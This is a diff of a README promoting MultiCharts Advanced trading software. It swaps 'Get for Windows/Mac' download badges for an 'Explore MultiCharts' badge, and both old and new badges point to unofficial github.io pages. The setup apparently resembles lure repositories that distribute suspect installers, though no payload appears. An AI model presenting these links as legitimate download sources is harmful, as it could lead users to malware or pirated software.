@@ -6,10 +6,8 @@
 <br>
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://felipeconleyhtdg.github.io/.github/Multicharts-Advanced)  
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://felipeconleyhtdg.github.io/.github/Multicharts-Advanced)
-</div>
+[![Explore MultiCharts](https://img.shields.io/badge/Explore-MultiCharts-0E7490?style=for-the-badge)](https://professional-multicharts.github.io/.github/)
 
 ---
 
@@ -57,11 +55,6 @@ MultiCharts Advanced Plan is particularly valued by professional traders who req
 
 ---
 
-
-<div align="center">
-  <img src="https://blog.azura.xyz/content/images/size/w2000/2025/01/data-src-image-7daf9f61-128b-49f3-95f2-8c9aae5b3ef6-1.png" width="1080"/>
-</div> 
----
 
 ## ⚙️ System Requirements  
 
